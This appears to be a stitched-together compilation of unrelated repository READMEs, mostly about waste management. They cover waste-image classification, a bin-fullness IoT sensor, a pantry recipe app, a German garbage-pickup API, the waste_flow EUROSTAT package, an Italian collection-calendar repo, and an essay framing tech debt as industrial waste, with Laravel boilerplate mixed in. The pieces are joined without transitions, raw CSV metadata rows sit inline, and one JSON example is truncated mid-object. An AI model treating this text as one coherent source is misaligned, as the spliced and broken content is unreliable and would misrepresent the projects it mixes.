Waste segregation process leads to recycling of waste, energy generation out of waste, reduction of waste and lessening of land fills. Our system helps to enable the sustainability of the management sector with participation from both the municipalities and private agencies .The purpose of our smart waste collection system is to propose a method of identification that performs detection using images to identify the different types of waste containers.The main goal is to be able to successfully identify and classify waste containers in a reliable manner.The economic value of waste is best comprehended when it is segregated. The waste becomes valuable if it is segregated and recycled using the recent advancements in technology thereby becomes a useful entity. This conversion method of waste can be employed to generate synthetic gas made up of carbon monoxide and hydrogen. The gas after burning can be used to produce steam and electricity, and for generation of bio fuels.Using convolution neural network, a class of deep, feed-forward artificial neural network has successfully been applied to analyze the image. Thus, in waste segregation using deep learning involves acquiring images from camera with detection, object recognition, prediction and classification into categories as biodegradable and non- biodegradable.For this system to be sustainable,awareness of household preferences is essential for design of this system.With the advent of deep network architectures that deals with Big Data, provides the best in class performance in terms of accuracy, scalability, adaptability without any feature engineering.

## About Laravel

Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:

- [Simple, fast routing engine](https://laravel.com/docs/routing).
- [Powerful dependency injection container](https://laravel.com/docs/container).
- Multiple back-ends for [session](https://laravel.com/docs/session) and [cache](https://laravel.com/docs/cache) storage.
- Expressive, intuitive [database ORM](https://laravel.com/docs/eloquent).
- Database agnostic [schema migrations](https://laravel.com/docs/migrations).
- [Robust background job processing](https://laravel.com/docs/queues).
- [Real-time event broadcasting](https://laravel.com/docs/broadcasting).

Laravel is accessible, powerful, and provides tools required for large, robust applications.

## Learning Laravel

Laravel has the most extensive and thorough [documentation](https://laravel.com/docs) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.

Waste Watcher is an IoT based sensor module to help keep track of waste data metrics with real-time bin fullness data and waste images. This is intended to help quantify and promote actionable solutions to reduce waste. This project is a continuation of [waste_watcher](https://github.com/zotbins/waste_watcher).

![](./imgs/waste_watcher.jpg)

## Features

- 🗑 Collect waste bin fullness telemetry
- 📷 Capture image of inside the waste bin
- 🔧 Fully customizable (adjust data collection rate, tweak case design for your needs, change camera settings, etc.)

## Why?  ¯\\_(ツ)_/¯
Simply put, we generate way too much waste here in the United States 🤧. According to the [EPA](https://www.epa.gov/sites/default/files/2019-03/documents/infographic_full-060513_v4.pdf), 267.8 million tons of trash were generated. And even though the US represents 4% of the global population we generate 12% of global municipal solid waste, right behind India and China ( [Verisk Maplecroft, 2019](https://www.maplecroft.com/insights/analysis/us-tops-list-of-countries-fuelling-the-mounting-waste-crisis/)). The trash itself also presents other harmful environmental impacts. US landfills are the 3rd largest source of human-related methane emissions ([EPA](https://www.epa.gov/lmop/basic-information-about-landfill-gas)). Waste also affects 43% of marine mammals ([EPA 2017](https://19january2017snapshot.epa.gov/trash-free-waters/impacts-mismanaged-trash_.html)).

Waste monitoring systems already exist in commercial settings, ZotBins expands waste monitoring to the individual and community level. Some of these existing systems include [Bigbelly](https://bigbelly.com/), [Compology](https://compology.com/), and [Enevo](https://enevo.com/index.html). ZotBins is completely opensource. Built for people, by people.

## Adafruit IO

This repo, in particular, uses [Adafruit IO](https://io.adafruit.com/), an off-the-shelf IoT platform. For now, Adafruit IO is a great addition to this project and helps in the following ways:
- 🤗 Helps makes the project more user-friendly (no need to setup your own server, ready to use APIs, Dashboard feature)
- 🆓 Free to use F O R E V E R ╰(*°▽°*)╯ (according to their [website](https://io.adafruit.com/))
- 🤝 Great community on Discord willing to help people out
- 🔒 Data is never [sold](https://www.adafruit.com/iotbor/)

## Getting Started

Follow the [Build Guide](./build_guide.md) 🛠.

## Actionable Ideas for Your Waste Data

Besides just collecting data, here are some ideas that you can implement. Again the goal of this project is to help quantify and promote actionable solutions to reduce waste.

- 🎯 Create a goal to reduce the rate at which you fill up a bin
- 💻 Use the Adafruit IO Integrations (Zapier, IFTTT)
    - Send a summary of weekly fullness rate
    - Send alerts when bin is full
- 🤖 Use machine learning to identify what items are thrown always
    - identify frequently thrown away items then try to reduce that waste (eg. plastic straws are identified frequently in the waste stream, so we can ban the straw or give sustainable alternatives)
    - identify which waste items are incorrectly thrown away

## How this Project Started

This project started at UCI in 2017 with a group of 4 undergraduates for a hackathon hosted by UCI TIPPERS. The aim of the project was to help create a tool to help with UCI's zero waste initiatives. Since then, the project is being shared to the open-source community through ZBCE and the ZotBins UCI undergraduate team continues with new members every year.

</p>

You're 2 weeks deep in the semester, the pantry you stocked over the holidays long forgotten and you've been eating DL Chicken for a week now. 

Expirare is a platform where you can find recipes tailored to your pantry!

You can enter all the food you have in your kitchen, with the expiry dates and Expirare will suggest recipes for you to try out!
You can add your own recipes or look at the recipes which use your ingredients from the Edamam API.

Try Expirare for no more food waste!

## Our Vision
According to the National Zero Waste Council's research on household food waste in Canada, almost 2.2 million tonnes of edible food is wasted each year, costing Canadians in excess of [$17 billion](https://www.toronto.ca/services-payments/recycling-organics-garbage/long-term-waste-strategy/waste-reduction/food-waste/). Most of this food is expired and uneaten at all. 

To combat this problem, our team has developed a web application called Expirare. 
## Expirare's Cool Features

### Recipedia Included:
With the Edamam Recipe API, we have over two million recipes from hundreds of websites, each with a detailed nutrition breakdown. 

Have strict diet restrictions or allergies? No problem! With over 80 diet and health filters, you know exactly what you are eating! If you want a more personal touch, we also have hundreds of shared recipes from users all around the globe for you to peruse. 

Running out of ideas to cook is a thing of the past.

### You know KungFU? Show me!
Have some secret recipe from the ancient times? Know some covert ""magic"" to help finish up that carrot? Show us! With a single click, you can share your recipe with users all around the globe, helping them reduce their food waste.

### Due today, cook today:
That tomato is expiring in 1 day? No worries, our web-app prioritizes items that is expiring soonest and give suggestions accordingly. Helping you prioritize those who craves that attention.

## How to run:
For now, to test this application, ensure that you have mongoDB installed on your device to implement a database. 

Clone this Github respository and run `npm i` to install the relevant packages.

Once the packages are installed, run `nodemon server.js` or `node server.js` and open port at localhost:8000 to try out our food saver!

## Future Plans:
We believe that Expirare can thrive with new features. In the future, we have suggestions to improve the applications with new features:

1. Providing analytics of food unused through the use of bar charts and graphs to give the users better awareness of their habits
2. Providing nutritional aid by tracking calories
3. Sending push alerts to the users if they wish, through email and sms
4. Add other recipes to your local database
5. Set up user accounts to personalize your selection

## Nutzung

Um die Müllabfuhrtermine für einen Ort abzufragen, sendet man einen GET Request an die selbstgehostete Datei oder den oben geführten Link mit folgenden Parametern:

- Ort: Name des Ortes
- Strasse: Name der Straße  
- Hausnummer: Hausnummer
- Hausnummerzusatz: Zusatz zur Hausnummer (optional)

Beispiel:

```
http://localhost/index.php?Ort=Oberammergau&Strasse=Schwedengasse&Hausnummer=12 
```
Die Antwort enthält ein JSON Objekt mit den Terminen für Restmüll, Gelbe Tonne, Papier, Bio und Sondermüll.

```json

                ""Zeichen"": ""S""
            }
        }
    }
}
```

Um zu prüfen, ob an einem bestimmten Tag Müll abgeholt wird, kann man zusätzlich den Parameter `Tag` angeben, mögliche Werte sind Heute, Morgen und ein Datum im Format Y-m-d (2023-12-01):

```
http://localhost/index.php?Ort=Oberammergau&Strasse=Schwedengasse&Hausnummer=12&Tag=2023-10-25
```

Die Antwort enthält dann ein vereinfachtes JSON Objekt mit dem Datum, ob an diesem Tag Müll abgeholt wird sowie Typ und Zeichen falls eine Abholung stattfindet.

```json
{
    ""Daten"": {
        ""Datum"": ""2023-10-25"",
        ""Abfuhr"": true,
        ""Typ"": ""Papier"",
        ""Zeichen"": ""P""
    }
}
```

Bei einem Datum ohne Abholung wird ein `false` in Abfuhr zurückgegeben.

```json
{
    ""Daten"": {
        ""Datum"": ""2023-10-20"",
        ""Abfuhr"": false
    }
}
```

xapple,waste_flow,,https://github.com/xapple/waste_flow,https://api.github.com/repos/waste_flow/xapple,A package for retrieving and analyzing data concerning waste management on the European continent.,"[![PyPI version](https://badge.fury.io/py/waste_flow.svg)](https://badge.fury.io/py/waste_flow)
![Pytest passing](https://github.com/xapple/waste_flow/actions/workflows/pytest_master_branch.yml/badge.svg)

# `waste_flow` version 1.3.2

`waste_flow` is a python package for retrieving and analyzing data concerning the waste management of European countries.

<p align=""center"">
<img height=""200"" src=""waste_flow/reports/template/logo.png?raw=true"">
</p>

## Installing

Since `waste_flow` is written in python it is compatible with all operating systems: Linux, macOS and Windows. The only prerequisite is python version 3.9 or above which is often installed by default. Simply choose one of the two following methods to install, depending on which package manager you prefer to use.

### Installing via `conda`

    $ conda install -c conda-forge -c xapple waste_flow

### Installing via `pip`

    $ python3 -m pip install --user waste_flow

### Troubleshooting

* If you do not have `conda` on your system you can refer to [this section](docs/installing_tips.md#installing-python-with-conda).
* If you do not have `pip3` on your system you can refer to [this section](docs/installing_tips.md#obtaining-pip3).
* If you do not have `python3` on your system or have an outdated version, you can refer to [this other section](docs/installing_tips.md#obtaining-python3).
* If none of the above has enabled you to install `waste_flow`, please open an issue on [the bug tracker](https://github.com/xapple/waste_flow/issues), and we will get back to you shortly.

## Usage

Bellow are some examples to illustrate the various ways there are to use this package.

To retrieve the large dataframe with dry mass for all years and all countries you can do the following from your python interpreter:

    >>> from waste_flow.analysis import waste_ana
    >>> print(waste_ana.dry_mass)

If you just want to see how much rubber waste did the UK generate in 2008, you can do the following:

    >>> from waste_flow.generation import waste_gen
    >>> params = (""waste   == 'W073' & ""
    >>>           ""country == 'UK' & ""
    >>>           ""year    == '2008'"")
    >>> result = waste_gen.long_format.query(params)
    >>> print(result)

To create the waste generation plots do the following:

    >>> from waste_flow.viz.gen_by_country import legend
    >>> print(legend.plot(rerun=True))
    >>> from waste_flow.viz.gen_by_country import countries
    >>> for gen_viz in countries.values():
    >>>     print(gen_viz.plot(rerun=True))

## Cache

When you import `waste_flow`, we will check the `$WASTE_FLOW_CACHE` environment variable to see where to download and store the cached data. If this variable is not set, we will default to the platform's temporary directory and clone a repository there. This could result in re-downloading the cache after every reboot.

## Features

The first time you run `waste_flow`, it will automatically download the raw CSVs from the EUROSTAT website to disk and parse the resulting data. On later runs, `waste_flow` will simply retrieve this information directly from the disk. This means that the first time you execute the pipeline things will be noticeably slower: this is normal.

## Source

The two datasets used in this pipeline are available at the following addresses:

* https://appsso.eurostat.ec.europa.eu/nui/show.do?dataset=env_wasgen&lang=en

* https://appsso.eurostat.ec.europa.eu/nui/show.do?dataset=env_wastrt&lang=en

These are obtained by starting at https://ec.europa.eu/eurostat/data/database and following ""Database by themes -> Environment -> Waste -> Waste treatment""

The full name of the datasets are:

* Generation of waste by waste category, hazardousness and NACE Rev. 2 activity (`env_wasgen`).
* Treatment of waste by waste category, hazardousness and waste management operations (`env_wastrt`).

## Customizing

The pipeline is flexible as the user can specify what coefficients they desire or even what custom waste categories they want to create. These input parameters are in the files under the `waste_flow/extra_data_xls` directory.

## Visualizations

The `waste_flow` package can also generate several types of plots that enable the user to compare and visualize the data.

For instance here is a series of graphs comparing the total reported waste generated in wet tonnes between European countries for the *nace* category `C20-C22`.

maurofrezza,Calendari-SAVNO,,https://github.com/maurofrezza/Calendari-SAVNO,https://api.github.com/repos/Calendari-SAVNO/maurofrezza,"Calendari della SAVNO servizi in formato digitale (CSV, JSON)","# Calendari-SAVNO
Questo repository contiene i calendari della SAVNO in formato digitale. Da diversi anni la SAVNO infatti forniva i calendari in formato Excel per permettere l'integrazione con l'app [Raccolta SAVNO](https://play.google.com/store/apps/details?id=com.rifiuti.savno).

## Perchè condividere i calendari?

Il supporto all'app è terminato con il 2021. L'app nasce nel 2013 come un progetto a tempo perso e ad uso personale (non mi ricordavo mai di portare fuori la spazzatura!).
Visto l'apprezzamento da parte dei vari utenti, voglio condividere i dati con voi nella speranza di ottenere aiuto nel supporto dell'app o far nascere qualche nuova iniziativa.

## Voglio aiutare a far continuare il progetto. Cosa posso fare?

Puoi aiutare a convertire i file CSV forniti dalla SAVNO Servizi e convertirli nel formato JSON usato dall'app.
Puoi anche donare qualche euro tramite PayPal nel link sulla pagina Facebook [Raccolta SAVNO](https://www.facebook.com/raccoltaSAVNO)

## Voglio inserire i calendari per il mio comune per continuare a usare l'app. Cosa posso fare?

Qui trovi tutti i file CSV con i prelievi 2022. Questi sono i calendari che la SAVNO stessa mi fornisce ogni anno.
Partendo da questi file bisgona generare i file in formato JSON come negli esempi. 

Una volta generati i dati, puoi aprire una pull request o mandarmeli alla mail di Raccolta SAVNO. Se sono corretti li caricherò sul server dell'app.

## E cosa te ne fai delle donazioni ora?
L'importo raccolto dalle donazioni potrà essere usato per beneficenza oppure per ricompensare chi ha convertito i dati. In ogni caso non voglio tenermeli. 

## FAQ

### Perchè hai smesso?

L'inserimento dei calendari avveniva nelle ultime settimane di Dicembre. Dovendo farlo nel mio tempo libero, spess lo facevo a cavallo di Natale e Capodanno. 

In aggiunta durante l'anno dovevo sempre rispondere a mail di supporto o recensioni di utenti spesso infuriati per problemi non dipendenti dall'app. Altre volte erano infuriati giustamente per problemi dell'app.

Ho capito che non riesco a fornire un servizio adeguato. Mi dispiace di non aver interrotto il servizio in un modo migliore.

### Perchè non metti l'app a pagamento?

Non credo tutti siano disposti a pagare per un servizio che già pagano e allo stato attuale non sono interessato a guadagnarci.
Ho provato in passato a chiedere un contributo su PayPal ma l'iniziativa non ha riscosso successo. Se volete donare trovate il link nella pagina Facebook.

### Perchè non chiedi i soldi alla SAVNO per finanziare il progetto?

Il progetto nasce senza fini di lucro. Ci sono stati vari tentativi da ambo le parti di formare una collaborazione ma non siamo mai riusciti a raggiungere un'intesa. Attualmente non sono interessato a farne un'attivita economica e quindi non ha senso parlare di soldi.

La SAVNO sta ora cercando di creare la propria applicazione. Magari qualcosa di buono nasce da tutto questo.

<ul>
<h4>Scenario</h4>
<p>Waste management is one of the most important problems faced in the today's world. An idea that can provide an effective waste management in the current scenario has become a necessity.<br>
The toxicity due to all types of pollution is a threat to human race. Our product will replace the current outdated waste management systems.</p>
<h4>Problem Statement</h4>
<p>How might we address waste (including e-waste), handling, storage, transportation, recycling, and final disposal of any residual waste in a uniform way globally such that the developing or poor countries are saved from becoming the dumping ground for the developed countries?</p>
<h4>Our Solution</h4>
<p>Our App features a new waste management system for rapidly growing cities. Instead of waiting for inefficient waste collection systems and unreliable pickup trucks to collect your waste, WRAP lets you request a pickup on-demand with just the tap of a button. WRAP platform is cheaper, efficient, and reliable than local incumbent systems, faster than their service, and Waste collection made easy and fantasized.<br>
Unlike other Waste management platforms, our idea is to spread good environmental habits of sorting and recycling your waste and help you to track your waste and impact
on the environment from your solid waste collection data.<br>
We categorize the collected waste according to our waste grading system and rewards with WRAP coins. They can be used to claim various deals and vouchers on our partner
websites. This would encourage the users to manipulate the recyclables properly. We are launching ""WRAP"", a web application that collect your recyclables and provides you with rewards for them</p>

### Description
**TrashMe** is a website that helps college students understand the trash items they usually throw away, and learn how to properly dispose the components based on categories. TrashMe is built using React.js, Javascript, HTML, CSS, deployed using Microsoft Azure, and based on the wireframes developed in Figma.

### Inspiration

Have you ever wondered whether you should throw your cupcake in a paper cup in the food bin or recycle bin? You see multiple colored trash bins but have no idea what each of them is used for throwing that trash and where the trash goes at the end. As international students and avid environmental lovers, we always struggled with this basic information about waste management when we first came to the US. Hence, we bring our app ""TrashMe"" which would be able to create awareness, guide users, make the process easier for them to manage their waste properly, and help the environment and us.

### Web Evaluation

- **Category:** Environmental awareness, Sustainability, Waste Management, Life Style
- **Web:** Web appication (first experience), may develop mobile application further
- **Story:** User can scroll through the trash list thrown by college students and also categories of different trashes. They can search  a particular trash. On clicking to that particular one, user would be able to see the category of the particular trash. User on clicking the category would get the information of where they should be throwing the trash or how they would be managing the waste they make.
- **Market:** Anyone who is an international student or a cllege student who isn't known about the composting or 3R techniques of waste management in the US would be able to use it to get the inforation and manage their trash in a right way. They can even see the most thrown wastes by students and be aware to decrease the waste they might make as a student.
- **Habit:** User can search throughout the day as many times as they would like to get the information. As people would be making waste in every aspect, they would be able to get the information for the right way to manage their waste in those moments.
- **Scope:** We will start with list of the trashes, most thrown trash, their categories, search bar to search them for making it user-friendly, and method of their management.


## Product Spec

### 1. What users can do in this app.

**Required Must-have Stories**

- [x] User can tap into the items page that is embedded in the main home page.
- [x] User can see the search bar where they can search for the particular trash.
- [x] User can tap in a particular item in items page and see their categories too.
- [x] User on clicking in a category would see the image on where it should be thrown and the information on whether it should be recycled or thrown to be compost etc.


**Planned future features**
* Launch a mobile application.
* User can create their own account.
* User can see the most searched trash on their account as a record.
* User can see a different category section for the wastes.
* User can read news articles about sustainability and waste management.

### How we built it

**We used the following technologies:**

- React.js, Javascript, HTML, CSS, Azure, Figma

1) We hard-coded our own datasets required for the project by researching different governmental papers and databases.
2) We took an online course on developing web applications using React as we had never used it before.
3) We did extensive research for designing the front end and deploying the application in Azure.

**Frontend Design** We used Miro Board to make our rough sketch first and used Figma to visualize the design of the website. Finally, we decorated our structured website incorporating React while using CSS. 

### Challenges we faced
1) Implementing Lottiefiles as a button on the Launch Page => found an alternative to that later; using gif instead
2) Merge conflicts in GitHub => solved them successfully
3) Linking one webpage to another page => succeeded in that with the mentor's help
4) Showing more than one category for a single waste item => dived deep to understand the logic and implemented it.
5) How to show information details in a consistent and organized way for all of the different trash items on the main page.


### What we learned and are proud of

1) Creating a working website with HTML, CSS, and React
2) Implementing a search bar
3) Deploying web application using Azure
4) Coding in a collaborative manner using Git
5) Trial and error in figuring out the first stages of the web app.

– Let's talk about **TECH-DEBT**  
– That thing again? **WHY?!**  

Do you find yourself in this conversation? (－‸ლ) **EXACTLY!**  

<img src=""assets/frustrated.png"" />

Unfortunately, we tend to adapt to discomfort and, without finding a solution to a chronic pain, we end up ignoring the ringing alarm for good.  

I've seen this repeating pattern many times in my career, especially when dealing with TECH-DEBT, so I started working backwards trying to understand why this is still an issue; after so many years.

Let's start with some history first.

## The ""discovery""

It's hard to talk in terms of ""world wide software industry"" before the early 90's if we consider ""industry"" as a production system for a large [consumer base](https://en.wikipedia.org/wiki/Customer_base) (**Microsoft Windows** was released on [November, 1985](https://en.wikipedia.org/wiki/Microsoft#1985%E2%80%931994:_Windows_and_Office) and **Classic Mac OS** in [January, 1984](https://en.wikipedia.org/wiki/Classic_Mac_OS)) but still, at that time, a lot of amazing high-level programming languages like COBOL or Fortran were already there—for decades—and many genius minds were around and thinking how to make things better; and they already had a clear understanding of the consequences of producing **""not-quite-right-code""**.

## The Metaphor

In 1992 the outstanding [Ward Cunningham](https://en.wikipedia.org/wiki/Ward_Cunningham) used the analogy of a financial [debt](http://c2.com/doc/oopsla92.html) to refer to that **""not-quite-right-code""** (you can see [his 5' video](https://www.youtube.com/watch?v=pqeJFYwnkjE) too)

## The adoption

It took some time, but, by the first decade of the 21st century the whole software engineering community adopted the term, the metaphor and the idea behind the words, building different strategies and protocols around the **debt-acquisition** and **debt-payment** dynamics. But yet, we're still here talking about that; frustrated and uncomfortable with the whole thing. **THERE is were I stopped and detected a glitch**.

## The Mind Glitch

The metaphor was adopted at a great cost, **simply because we're all biased when it comes to financial debt**, the ""debt"" **signifier** is quiet innocuous but the **signified** is a dark universe! ([signifier/signified](https://en.wikipedia.org/wiki/Course_in_General_Linguistics))

1. Being in debt is something we avoid
2. Owing money is scary
3. Making a client owe money feels WRONG
4. We shouldn’t be leaking our client’s pocket
5. Hiding a small money leak is easy until it isn’t, but it might be somebody else's problem by then. (pass–the–buck factor)
6. No one wants to pay for somebody else’s debts!

And it wasn't Cunningham's fault, it was ours, we, individually, introduced the signified bug and covered the **""not-quite-right-code""** thing with such a negative aura that it makes us struggle to think clearly on the problem.

## The Mind Shift

The first thing I do when I feel lost is to calm down and look around to find some reference points. Going back to the ""manufacturing"", ""industry"" and ""not-quite-right-thing"" we can find some ""intersections"".

![Timber](assets/timber.png)
*Photo by [Alexander Andrews](https://unsplash.com/photos/c91LS-JK7cw) on [Unsplash](https://unsplash.com/)*

Every industry produces ""not-quite-right-stuff"" along with ""the-right-stuff"" and the term is **industrial waste**; it can be environmentally friendly, recyclable, sellable, lightly toxic or extremely poisonous and radioactive but they all generate some kind of sub-product during the manufacturing process and they all had to learn to deal with it, in most cases regulated by law.  

![Mining](assets/mining.png)
*Photo by [Michal Pech](https://unsplash.com/photos/xS5bOLKCSLw) on [Unsplash](https://unsplash.com/)*

At this point it becomes crystal clear that **the natural sub-product of the software industry IS TECH-DEBT**.  

The [TTM](https://en.wikipedia.org/wiki/Time_to_market) has mutated from a per-year basis to a per-sprint one; the technology also evolves at a thrilling pace, all this means that we're producing an incredible amount of waste. Blame the market, the managers, FOMO related to tech trends, but even if I produce the best code today, tomorrow it might be legacy/incorrect/deprecated and that's just for the green field; we're not even including existing legacy code in the equation.

Our work permeates almost everything around us, from the most trivial mobile app and up to medical devices, transportation and aerospace industries; this is a huge responsibility, so being systematic and thoughtful on how we prepare our work to be easy to maintain and fix, will make the difference between a bad day and a life.

## The Plan

So now what? We detected a glitch but what can we do about it?  

**BE INTENTIONAL**  

By intentional I mean to do something about it every day through a strict plan. The plan is defined by **9 sustainment principles** which are both **independent** and **interrelated**.

- **Operational Cycle**
  - Preparation
    - [1. Analysis](#1-analysis)
    - [2. Knowledge Base](#2-knowledge-base)
    - [3. Tooling](#3-tooling)
  - Execution
    - [4. Collection](#4-collection)
    - [5. Distribution](#5-distribution)
    - [6. Processing](#6-processing)
- **Strategic Cycle**
  - Leading
    - [7. Prevention](#7-prevention)
    - [8. Audit](#8-audit)
    - [9. R&D](#9-rd)

![Operational Cycle](assets/operational_cycle.png)

### Preparation

Every output here should be designed to iteratively improve the [execution](#execution) group.

#### 1. Analysis

**Code Analysis** can be done manually, through developer tools or through automated tools, but all existing code—old or new—should be analyzed. An iterative process must be defined and followed by every team and the output captured in a backlog.

**Metrics** will be highly affected by the development process and the technologies involved, but metrics are the key to understand the big picture in many ways, e.g.—at a high level—if you divide `(total commits / bug-fix commits) * 100` you'll obtain a defect commit rate percentage. Many insightful numbers can be obtained through metrics, but of course, to have metrics you have to generate them somehow. If you're not sure about what to measure, just start measuring something, the ideas may come together with the numbers.

#### 2. Knowledge Base

There's no point for Analysis if it's not captured in a knowledge base, **a project MUST have a wiki**.

Unless captured at company level, **design and write down protocols** for common tasks in a concise way, too many or too few rules will tend to produce more mistakes during execution.

#### 3. Tooling

The result of analysis and knowledge base should **produce some kind of tooling**. These tools can be designed to assist stepin 1 and 2 or to assist in step 4. Be intentional on investing time and resources to build  hight quality tools for the ""manufacturing"" process.

### Execution

Every output here should be designed to iteratively plan and manufacture the product.

#### 4. Collection

All insights produced during preparation **should be collected, sorted, validated and organized in a backlog**. An empty or inexistent tech-debt backlog is a big sign of waste accumulation.

Organize your backlog as an **intentional data-oriented source of information**, you'll have to see the numbers to make better decisions on each step of the cycle.

#### 5. Distribution

Here's where your **sprint/quarter planning** shines, you have the analysis, the protocols, the tools and the material; plan around it all, allocate time and resources and distribute the work, pursuing constant improvement instead of instant perfection.

**Generate and use metrics** for this so to share the tech-debt processing tasks in a sustainable way for your people and your business. This shouldn't create tension or burn out anybody but it has to be constantly captured as part of the daily work of a team.

#### 6. Processing

And here's where **all the previous work collapses into a concrete code** action by being recycled—if useful for other purposes—refactored, fixed, deprecated or disposed, and **annotations get added for the next cycle**.

Also here, **metrics** can be extremely useful. How much code needed to be refactored, fixed or deprecated? Why? Was it old or a recently created code?

![Strategic Cycle](assets/strategic_cycle.png)

### Leading

[Preparation](#preparation) and [Execution](#execution) groups tend to be incremental, linear and continuous; **leading** is meant to be **exponential**. If a jump is possible we'll see it here.

#### 7. Prevention

As in every industry, minimizing waste production during manufacturing is a game changer. The prevention principle is **interrelated** with the [Execution](#execution) area of the life-cycle.

#### 8. Audit

- Train specialists
- Audit the code AND the processes
- Get metrics

The auditing activity is **interrelated** with the [Preparation](#preparation) area of the life-cycle.

#### 9. R&D

- Can we produce less waste?
- Can all this framework be replicable?
- Can this be abstracted as a standard?
- Can we design general purpose tools for all our projects?
- Can we productize something?

The R&D activity affects both the [Preparation](#preparation) and the [Execution](#execution) areas of the life-cycle.

## TL;DR

- Tech-debt is not a bad thing ""per se"", **the bad thing is the ""un"" factor**
  - Un-known
  - Un-wanted
  - Un-tracked
  - Un-intentional
  - Un-planned
  - Un-handled
- **Bug fixing and security are commonly related to tech-debt** but that's **not a [""sine qua non""](https://en.wikipedia.org/wiki/Sine_qua_non) condition**. Having separated backlogs or tags for bug fixing, security and technical debt is a good idea and the more data-oriented and granular the backlog is, the easier to analyzing the data will be.
- **The plan can be applied retrospectively** with great benefits, start analyzing, tagging and organizing your old backlog thinking about tech-debt and crunch some numbers; you'll be surprised.

### Closing notes

A lot of work is still required, each principle should be refined along with the concrete tasks, but the high level definition is clear.

## HACKTABLE 2021

## INSPIRATION
Inspired from the sustainablity I follow up in my life to reduce the ecological footprint and plastic as much as I could.

## MY PROJECT
This project spreads up the awareness and educate the upcoming generations about environmental issues and climatic changes in engaging way. It's basically a game where the trash is been thrown away by the consumers on roads. Here, we as a responsible citizen thriving for a sustainable earth filter out the trash into compost and recycle bins using appropriate keys. It keep track of the points and updates us with the scores simultaneously. This would definitely put individuals on work in gaining wisdom about saving our mother nature from all the malpractises.

Youtube Link : https://www.youtube.com/watch?v=trRKaLj0BN8

## HOW I BUILT IT
I had built it using python including libraries needed and as well had imported assets and sounds to make it more functional and realistic. I had used various classes and functions to call all the objects at right point of time in games functionality. The main file consists of all basic inputs along with user friendly GUI and activated operations for enabled buttons. The score tracking is embedded along with 'p' for pause and 'g' for go. Along with it, I had used 'a' and 'd' keys for compost bins, 'right' and 'left' arrow keys for recycle bin. It's a realistic challenge and can't wait to see judges enjoy this hack. I reason I choose this is to make hackathon fun and also address the pressing issue of the decade. Totally loved building this hack. 

## CHALLENGES FACED
The main challenge was to get all the functionalities right and overcome hell lot of bugs which was indeed daunting. Other troube I had faced is trash stopping abruptly in the middle of the game. I gave my most of the time in solving these issues and got frantic of if I could submit the project on time.

## ACCOMPLISHMENTS
I am proud of what I had accomplished. Contributing a hack to address a well needed environmental issue was exciting to indulge with. Hope that day comes off soon, where plastic is completely banned from usage. Literally, I had to multitask across various other works and squeeze up the best possible time to make this project as pleasing as it can get.

## WHAT I HAD LEARNT
Learnt using python libraries and applying the functionalities and all intregating all the assets and related classes to show up and activate at right point of time when game is running. It was a wonderful learning weekend.

## FUTURE OF GARBAGE FILTER
I would add up more functionalities to make this hack versatile.

sleepingcat4,WasteNet,,https://github.com/sleepingcat4/WasteNet,https://api.github.com/repos/WasteNet/sleepingcat4,Re-creating UK's leading Waste Classification Algorithm,"Repository contains code to implement Uk government’s leading Waste classification Algorithm. The code for the published paper was not available neither any explicit instructions except for the methodology and novel approach that they took. 

## Introduction


WasteNet shows superior capability in classifying images over previously known pre-trained models such as ResNet-50, AlexNet and DenseNet. It uses a novel technique proposed by the authors of the paper i.e. Hybrid Tuning that leverages both feature extraction and fine-tuning. 

A approach known as discriminative learning was used to prevent “catastrophic forgetting” and overall generalise the dataset and convergence. 

## Dataset

WasteNet was originally trained on trashnet dataset which was open sourced by Stanford University. It contains 2533 images of waste in 6 different categories. 

## Data Augmentation


Originally several data augmentation techniques were used on the dataset before feeding the final version of the dataset. But, in our research and implementation of the paper, we focused more on the Model’s Architecture and achieving a good overall score. 

## File-structure
Augmentation contains a python function to augment your dataset as per mentioned in the original paper. model.py & train.py respectively contain the model architecture and training code for training it on CIFAR-10 dataset. 

## Training

In our training, we assumed the hyperparameters since it was not explicitly mentioned in the paper, and trained the model for 20 epochs. Though the original paper trains the model for 1000 epochs to achieve convergence and 97% accuracy. Highest known till date. 

## Development

The Model and paper is still under-development. Though we have already implemented the original model architecture as mentioned in the WasteNet paper, we are thinking of changing a few lines and features of our own and adding some. We’ll continue to update the code. 

## Licence

This repository falls under a modified MIT Licence, which means you can’t sublicense/sell the software/algorithm/artificial intelligence written in this repository without the explicit permission from **sleepingcat**. And the code in this repository can only be used for research purposes strictly.

### Project developed during [Rocketseat](https://rocketseat.com.br/)'s Next Level Week #1 event

The project is split into three main parts:
 - **server**: API for creating and listing waste collection points
 - **web**: web site for registering waste collection points
 - **mobile**: mobile app for viewing collection points

### Running the project:

 - Server: 
    - Create the database: `npm run knex:migrate`
    - Seed the database with collectable waste types: `npm run knex:seed`
    - Start application: `npm run dev`

 - Web: `npm start`

 - Mobile: 
    - If you don't already have it, install [expo](https://expo.io/): `npm install -g expo-cli`
    - Start application: `npm start`

## Getting Started
### Installing Dependencies
####python3.7
we are using python as a backend language
Follow instructions to install the latest version of python for your platform in the [python docs](https://docs.python.org/3/using/unix.html#getting-and-installing-the-latest-version-of-python)
##### Windows
[python3.7](https://www.python.org/downloads/windows/)
#### virtual environment
We recommend working within a virtual environment whenever using Python for projects. This keeps your dependencies for each project separate and organaized. Instructions for setting up a virual enviornment for your platform can be found in the python docs

#### PIP Dependencies
Once you have your virtual environment setup and running, install dependencies by navigating to the `/backend` directory and running:
```shell script
pip install -r requirements.txt
```
This will install all of the required packages we selected within the `requirements.txt` file.

An exploration of using open-source hardware &amp; software to democratize waste recycling and processing  

![](images/multi-spectral-ros-nodes.jpg)  

![](images/multi-spectral/all-channels.jpg)

Each year humans collectively dump over 2 billion tons of waste and are on track to over 3.4 billion tons/ year by 2050. Currently this directly affects over 61 million people, and amounts to approximately 5% of greenhouse gas emissions.

Almost half of all wastage is food waste, of which 40% is wasted at retail and consumer levels due to an over-emphasis on appearance in quality standards. Despite such a large quantity of waste coming from food, only a small portion of this is composted (when food waste is placed in landfill it produces methane rather than CO2, see [compost vs landfill](https://recycle.com/organics-compost-vs-landfill/)). In addition many methods for up-cycling food wastage simply aren't implemented either due to increased cost of manual labor, or lack of adoption industry wide.

